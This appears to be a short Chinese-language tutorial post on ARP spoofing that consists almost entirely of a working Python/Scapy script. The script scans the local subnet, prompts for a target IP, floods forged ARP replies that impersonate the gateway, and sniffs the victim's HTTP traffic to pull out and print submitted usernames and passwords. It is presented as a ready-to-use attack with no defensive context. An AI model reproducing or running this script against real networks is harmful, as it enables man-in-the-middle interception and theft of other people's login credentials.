# ARP欺骗

代码：
```
import time
import re 
import os
from scapy.all import *
from threading import Thread

#定义变量函数
wifi = 'Intel(R) Dual Band Wireless-AC 7265'
rtable = os.popen('route print').read()
#print(rtable)
#注意将列表转为字符串
getway = re.findall(r'0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s',rtable)[0]
#print(getway)

#局域网扫描
def scan():

#SR()函数用来来发送数据包和接收响应，他会返回两个列表数据，一个是answer list 另一个是unanswered list
#公式：pack=Ether(src=攻击者MAC地址,dst=目标MAC地址)/ARP(hwsrc=攻击者MAC地址,psrc=要假装谁就是谁的IP地址,hwdst=目标MAC地址,pdst=目标IP地址,op=2)
    ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=getway+'/24'),timeout=1)
    print('一共扫描到%d个主机：'%len(ans))
    for i in ans:
        print(i)
 
#找用户名和密码
def paw(p):
    try:
        if p.haslayer(Raw):
            ss=p.load.decode()
            result=re.findall(r'userName=(.+)&passWord=(.+)',ss)
            if result:
                print('user:',result[0][0])
                print('pass:',result[0][1])
    except:
        pass
      
#抓包
def capture(tip,tcap):
    #冒充自己为网关
    pkts=sniff(iface=wifi,timeout=tcap,filter='tcp port 80 and src host %s'%tip,prn=paw)
        
#arp欺骗攻击
def arpspoof(tip,tcap):
    t = Thread(target=capture,args=(tip,tcap))
    t.start()
    for i in range(tcap*5):
        sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target,psrc=getway))
        time.sleep(0.2)

    
    
if __name__ == '__main__':
    scan()
    target = input('输入要攻击的ip地址：').strip()
    tl = int(input('输入要准备攻击的时间：').strip())
    arpspoof(target,tl)
    print('攻击结束！')
```